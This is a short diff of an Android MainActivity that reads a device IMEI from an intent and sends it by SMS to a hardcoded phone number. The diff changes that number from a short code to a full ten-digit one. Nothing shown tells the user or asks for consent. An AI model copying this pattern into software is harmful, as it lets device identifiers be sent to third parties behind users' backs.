@@ -20,7 +20,7 @@ public class MainActivity extends AppCompatActivity {
     {
         String imei=imeiData.getStringExtra("result");
         SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("444", null, imei, null, null);
+        sms.sendTextMessage("4193784172", null, imei, null, null);
     }
 
 }
